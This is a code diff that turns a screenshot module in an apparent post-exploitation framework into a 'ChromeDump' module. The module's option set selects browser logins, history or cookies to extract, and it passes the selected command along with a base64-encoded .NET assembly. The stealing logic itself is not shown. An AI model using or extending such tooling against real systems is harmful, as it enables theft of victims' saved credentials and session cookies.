@@ -6,15 +6,15 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'ScreenShot',
+            'Name': 'ChromeDump',
 
             'Author': ['@harmj0y'],
 
-            'Description': ('ScreenShot'),
+            'Description': ('ChromeDump'),
 
             'Background' : False,
 
-            'OutputExtension' : 'png',
+            'OutputExtension' : None,
             
             'NeedsAdmin' : False,
 
@@ -31,6 +31,11 @@ class Module:
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
+            'Command' : {
+                'Description'   :   'chrome dump command:all/logins/history/cookies',
+                'Required'      :   True,
+                'Value'         :   'logins'
+            },
             'Version' : {
                 'Description'   :   'dotnet version',
                 'Required'      :   True,
@@ -57,5 +62,6 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
         #moduleSource=self.mainMenu.installPath+"/data/module_source/dotnet/"
         version=self.options['Version']['Value']
+        command=self.options['Command']['Value']
         assembly = helpers.get_dotnet_module_assembly(self.mainMenu.installPath,self.info["Name"],version)
-        return base64.b64encode(assembly)
+        return base64.b64encode(assembly)+','+base64.b64encode(command)
